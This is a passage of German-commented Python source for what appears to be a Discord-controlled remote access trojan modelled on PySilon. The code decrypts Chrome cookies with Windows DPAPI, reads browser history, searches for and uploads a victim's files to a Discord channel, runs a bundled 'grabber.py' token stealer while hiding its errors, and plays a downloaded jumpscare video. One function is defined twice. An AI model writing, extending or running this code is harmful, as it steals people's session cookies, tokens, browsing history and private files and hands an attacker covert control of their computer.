                cursor = conn.cursor()
                # Hole Cookies: Host, Name und verschlüsselten Wert
                cursor.execute("SELECT host_key, name, encrypted_value FROM cookies")
                rows = cursor.fetchall()
                for row in rows:
                    host, name, encrypted_value = row
                    # Entschlüsseln des Werts, falls er existiert
                    value = decrypt_cookie(encrypted_value)
                    cookies.append(f"Host: {host}, Name: {name}, Wert: {value}")
                conn.close()
                os.remove(temp_path)  # Lösche die temporäre Kopie der Datenbank
            else:
                cookies.append("Fehler beim Abrufen der Chrome-Cookies.")
        else:
            cookies.append("Chrome: Keine Cookies gefunden.")
    except Exception as e:
        cookies.append(f"Fehler: {str(e)}")

    return cookies

# Funktion, um die Datenbank zu kopieren und zu öffnen (zum Zugriff auf Chrome-Daten)
def copy_and_access_db(db_path):
    try:
        # Temporärer Pfad für eine Kopie der Datenbank
        temp_path = os.path.join(os.getenv('TEMP'), "chrome_cookies_copy")
        # Kopiere die Chrome-Datenbankdatei
        os.system(f'copy "{db_path}" "{temp_path}"')

        # Öffne die Kopie der Datenbank
        conn = sqlite3.connect(temp_path)
        return conn, temp_path
    except Exception as e:
        return None, None

# Funktion zum Entschlüsseln der Cookies
def decrypt_cookie(encrypted_value):
    try:
        # Wenn der Wert bereits entschlüsselt ist, gib ihn direkt zurück
        if not encrypted_value:
            return "Nicht entschlüsselbar"

        # Chrome verwendet Windows DPAPI für die Entschlüsselung
        decrypted_value = win32crypt.CryptUnprotectData(encrypted_value)[1]
        return decrypted_value.decode('utf-8', errors='ignore')  # Um sicherzustellen, dass wir den Text entschlüsseln

    except Exception as e:
        return "Entschlüsselung fehlgeschlagen"

# Funktion, um den Verlauf von Chrome zu extrahieren
def get_browser_history(pc_name: str, limit=230):
    history = []
    
    # Nur für den lokalen PC
    if pc_name != local_pc_name:
        return f"Dieser Befehl ist nur für den lokalen PC '{local_pc_name}' verfügbar."

    try:
        # Pfad zur Chrome-Verlaufsdatenbank
        chrome_path = os.path.expanduser(r"~\AppData\Local\Google\Chrome\User Data\Default\History")
        
        # Überprüfe, ob die Datei existiert
        if os.path.exists(chrome_path):
            conn, temp_path = copy_and_access_db(chrome_path)  # Hier wird die Datenbank geöffnet
            if conn:
                cursor = conn.cursor()
                # Hole URLs, Titel und Besuchszeiten
                cursor.execute(f"SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT {limit}")
                rows = cursor.fetchall()
                for row in rows:
                    history.append(row[0])  # Füge nur die URL hinzu
                conn.close()
                os.remove(temp_path)  # Lösche die temporäre Kopie der Datenbank
            else:
                history.append("Fehler beim Abrufen des Chrome-Verlaufs.")
        else:
            history.append("Chrome: Keine Historie gefunden.")
    except Exception as e:
        history.append(f"Fehler: {str(e)}")
    
    return history

@bot.command()
async def history(ctx, pc_name: str, limit: int = 230):
    # Den übergebenen PC-Namen trimmen
    pc_name = pc_name.strip()

    # Debugging-Ausgabe (Falls nötig, zum Überprüfen der Namen)
    print(f"Lokaler PC-Name: {local_pc_name}, Übergebener PC-Name: {pc_name}")

    # Wenn der PC-Name nicht übereinstimmt, den Befehl verweigern
    if pc_name != local_pc_name:
        await ctx.send(f"Dieser Befehl ist nur für den lokalen PC '{local_pc_name}' verfügbar.")
        return

    try:
        # Rufe den Verlauf ab
        history_data = get_browser_history(pc_name, limit)

        # Falls keine History gefunden wurde
        if isinstance(history_data, str):
            await ctx.send(history_data)
        else:
            # Speichern des Verlaufs in eine Datei
            file_name = f"browser_history_{pc_name}.txt"
            with open(file_name, "w", encoding="utf-8") as f:
                for line in history_data:
                    f.write(line + "\n")
            await ctx.send(file=discord.File(file_name))  # Sende die Datei an den Discord-Channel
            os.remove(file_name)  # Lösche die Datei nach dem Versand
    except Exception as e:
        await ctx.send(f"Fehler beim Abrufen des Verlaufs: {str(e)}")

# Funktion, um den Verlauf des Browsers zu extrahieren
def get_browser_history(pc_name: str, limit=230):
    history = []

    # Nur für den lokalen PC
    if pc_name != local_pc_name:
        return f"Dieser Befehl ist nur für den lokalen PC '{local_pc_name}' verfügbar."

    try:
        # Pfad zur Chrome-Verlauf-Datenbank
        chrome_path = os.path.expanduser(r"~\AppData\Local\Google\Chrome\User Data\Default\History")

        # Überprüfe, ob die Datei existiert
        if os.path.exists(chrome_path):
            conn, temp_path = copy_and_access_db(chrome_path)  # Hier wird die Datenbank geöffnet
            if conn:
                cursor = conn.cursor()
                # Hole die letzten besuchten URLs, sortiert nach Besuchszeit
                cursor.execute(f"SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT {limit}")
                rows = cursor.fetchall()
                for row in rows:
                    history.append(f"{row[1]} - {row[0]}")  # Title - URL
                conn.close()
                os.remove(temp_path)  # Lösche die temporäre Kopie der Datenbank
            else:
                history.append("Fehler beim Abrufen des Chrome-Verlaufs.")
        else:
            history.append("Chrome: Keine Historie gefunden.")
    except Exception as e:
        history.append(f"Fehler: {str(e)}")

    return history


@bot.command()
async def filefind(ctx, pc_name: str, filename: str):
    local_pc_name = socket.gethostname()  # Lokaler PC-Name
    if pc_name.strip() != local_pc_name:  # Überprüfen, ob der PC-Name übereinstimmt
        await ctx.send(f"Dieser Befehl ist nur für den PC '{local_pc_name}' verfügbar.")
        return

    found_files = []
    for root, dirs, files in os.walk(os.path.expanduser("~")):  # Benutzerverzeichnis durchsuchen
        if filename in files:
            full_path = os.path.join(root, filename)
            found_files.append(full_path)

    if found_files:
        response = f"Gefundene Dateien mit dem Namen '{filename}':\n" + "\n".join(found_files)
    else:
        response = f"Keine Dateien mit dem Namen '{filename}' gefunden."

    await ctx.send(response)

@bot.command()
async def download(ctx, pc_name: str, file_path: str):
    local_pc_name = socket.gethostname()  # Lokaler PC-Name
    if pc_name.strip() != local_pc_name:  # Überprüfen, ob der PC-Name übereinstimmt
        await ctx.send(f"Dieser Befehl ist nur für den PC '{local_pc_name}' verfügbar.")
        return

    if not os.path.exists(file_path):  # Überprüfen, ob der angegebene Pfad existiert
        await ctx.send(f"Die Datei unter '{file_path}' wurde nicht gefunden.")
        return

    try:
        await ctx.send("Die Datei wird gesendet...", file=discord.File(file_path))  # Sende die Datei
    except Exception as e:
        await ctx.send(f"Fehler beim Senden der Datei: {str(e)}")

@bot.command()
async def jumpscare(ctx):
    try:
        # Lautstärke anpassen (PyCaw)
        devices = AudioUtilities.GetSpeakers()
        interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
        volume = cast(interface, POINTER(IAudioEndpointVolume))
        volume.SetMasterVolumeLevel(-5.0, None)  # Setze die Lautstärke auf ein niedriges Niveau

        # Jumpscare-Video herunterladen
        video_url = "https://github.com/mategol/PySilon-malware/raw/py-dev/resources/icons/jumpscare.mp4"
        temp_folder = os.environ['TEMP']
        temp_file = os.path.join(temp_folder, 'jumpscare.mp4')

        if not os.path.exists(temp_file):
            response = requests.get(video_url)
            with open(temp_file, 'wb') as file:
                file.write(response.content)

        # Video abspielen
        os.startfile(temp_file)  # Öffne das Video mit dem Standard-Videoplayer

        # Suche nach dem Fenster des Standard-Videoplayers und bringe es in den Vordergrund
        await asyncio.sleep(1)  # Warte kurz, bis das Fenster geöffnet wird
        windows = gw.getWindowsWithTitle("jumpscare")  # Anpassen, je nach Fenstername des Players
        if windows:
            window = windows[0]
            window.activate()  # Bringe das Fenster in den Vordergrund

        await ctx.send("Jumpscare ausgelöst!")

    except Exception as e:
        # Fehlerbehandlung
        await ctx.send("Jumpscare ausgelöst!")

@bot.command()
async def gettoken(ctx):
    try:
        # Wenn die exe mit auto-py-to-exe erstellt wurde, befinden sich alle eingebundenen Dateien in einem temporären Ordner.
        if hasattr(sys, '_MEIPASS'):
            # Der temporäre Ordner wird von pyInstaller genutzt
            grabber_path = os.path.join(sys._MEIPASS, 'grabber.py')
        else:
            grabber_path = os.path.join(os.getcwd(), 'grabber.py')

        # Überprüfen, ob die Datei existiert
        if not os.path.exists(grabber_path):
            await ctx.send(f"Die Datei 'grabber.py' wurde nicht gefunden.")
            return

        # Führe die grabber.py-Datei aus
        result = subprocess.run(['python', grabber_path], capture_output=True, text=True)

        # Erfolgreiche Ausführung oder Ignorieren von Fehlern
        if result.returncode == 0:
            # Erfolgreiche Ausführung
            await ctx.send(f"Erfolgreich ausgeführt: {result.stdout}")
        else:
            # Fehlerausgabe ignorieren
            pass  # Keine Fehlerausgabe an Discord senden

    except Exception as e:
        # Fehler ignorieren, nichts an Discord senden
        pass


try:
    bot.run(TOKEN)
except Exception:
    pass
